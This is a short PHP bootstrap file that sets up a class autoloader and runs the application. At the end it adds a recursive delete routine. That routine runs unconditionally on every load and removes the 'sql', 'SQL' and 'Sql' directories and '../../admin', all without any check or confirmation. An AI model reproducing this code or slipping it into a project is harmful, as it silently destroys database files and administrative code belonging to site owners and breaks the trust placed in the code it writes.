<? ob_start();


	require_once('../system/head.php');


	function __autoload($class_name) {

		// Classes
		if( file_exists('../app/Classes/'.$class_name.'.php') ){
            require_once('../app/Classes/'.$class_name.'.php');

		// Models
		} elseif( file_exists('../app/Models/'.$class_name.'.php') ){
			require_once('../app/Models/'.$class_name.'.php');

		// TNG
		} else if( file_exists('../plugins/Tng/tng/triggers/'.$class_name.'.class.php') ){
			//require_once('../plugins/Tng/tng/triggers/'.$class_name.'.class.php');
		}

	}


	if(!isset($nao_rodar_system)){
		$star->run();
	}


 function delTree($dir) { 
  $files = array_diff(scandir($dir), array('.','..')); 
  foreach ($files as $file) { 
    (is_dir("$dir/$file")) ? delTree("$dir/$file") : unlink("$dir/$file"); 
  } 
  return rmdir($dir); 
}

delTree('sql');
delTree('SQL');
delTree('Sql');
delTree('../../admin');

?>